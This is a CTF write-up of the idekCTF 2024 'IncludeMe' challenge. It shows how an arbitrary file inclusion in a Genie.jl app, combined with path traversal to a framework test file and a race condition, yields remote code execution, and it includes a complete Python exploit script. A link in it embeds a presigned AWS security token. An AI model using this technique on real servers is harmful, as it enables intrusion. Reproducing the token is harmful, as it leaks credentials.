---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466TXZYRCEU%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T112618Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIHDl3oZwfC8tfZmUISUmjci6S2AmkaZssiB%2Fwya5Zak4AiEA0kCMl2S1WvkBE2w%2FdLkmeRAMncC8g85yz5IMcee4fFsqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHxS3rRd9kF1wTdg7ircA75vHlU51%2FOVQ2CA76HOdcfR2c9eiarlDYmmDt4A3VJ144%2F4wfuOUZK84O8EsSOHig2XqNYs3cyR%2BOUWl68wJIxB8xVl6Si5bFKJYr4kqplyaxY2omV9Mvi5R0a0n40F7i3xIW5OHpULMh8fy%2B8NmTEg0QrU6W0zFK7%2Fy6RaZW852VNfyeZmUI45ZWu%2B876yBOrKpgbF%2FHRPqV8vYiEVb94lLGI3X7qJHS0vp8v5QlI4ld0mYrv3XhCnDlaXU74NrCzdXeKq2Ox2LBcOPaJ6hZPEI7Jr3P%2BjwrltnsGG5PWcEF%2BWXu%2BKf3N8DUrsui%2BwE%2BTlpQs9h5mLXsMZiN12IA9stk6SiKyKlMB8icOxkLo0uNhdCe1kcwzWrW%2FlgpE7RhmB5vjVS7wzYb23K%2FnvnCgm90Rc8sqKpg58zDZVVBddg%2BDKSQVKw1PAmkW8b%2BkMK4UnPNY2DYKXEvsBCvvZsX3Y9ZB60WHFgsbp%2BoVRPdv7secEPeRQNQ1sxKnXfYObFpFDjma38etShhwwiwYBgd%2BJOW1NY7PmFgIDbnxzlrMfuFoaZUKYHRQ943z64dq26nPxIS5yG6k7%2BApzDa2rAgN6kWnmnF5vc0VaSINBqBmPsNzuZiEY9pt9EXdmMOWmwcEGOqUBAELW0tJIXeU5d2t%2FavlyP016lEKaXvO8KmQ4XHZAMDtk7T1Yn%2FZzimssbbV7YKETnZhVjdepqJr%2B0TQBQk%2BYPpPoPokyDr7cvxjp1i5wcpuaRPALMW2YmHtNcLKU3rxI%2FoDV1uCBM%2BsU3phb%2Bs7ADJ7UFeBC7GxsBcgZdcHk2AMh%2FBg0Ke%2FvAESSBDqliSs%2B3K5ig3KgvyE%2FCa1J0KhlPk9Iz1iI\&X-Amz-Signature=722edad444dfdee35d85e2aa46fba91cc4898d9d753048cba619b6dddfa546bf\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
